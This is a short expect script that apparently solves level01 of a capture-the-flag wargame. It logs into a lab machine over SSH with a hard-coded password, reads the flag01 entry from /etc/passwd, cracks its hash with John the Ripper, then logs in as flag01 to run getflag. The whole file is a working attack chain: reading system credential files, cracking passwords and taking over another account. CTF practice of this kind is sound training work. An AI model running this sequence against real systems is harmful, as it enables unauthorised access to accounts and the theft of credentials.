#!/usr/bin/expect -f
set ip 192.168.1.103
set prompt "~="
spawn ssh -o "StrictHostKeyChecking no" level01@$ip -p 4242 "cat /etc/passwd | grep flag01"
expect "sword:"
send "x24ti5gi3x0ol2eh4esiuxias\r"
expect -re "\r\n(.*?)\r\n"
set password $expect_out(1,string)
set outfile [open "passwd" w]
puts $outfile $password
close $outfile
spawn apk add john
expect $prompt
spawn john passwd
expect $prompt
spawn john --show passwd
expect -re ".*?:(.*?):.*"
set password $expect_out(1,string)
puts $password
spawn ssh -o "StrictHostKeyChecking no" flag01@$ip -p 4242 "getflag"
expect "sword:"
send "$password\r"
interact
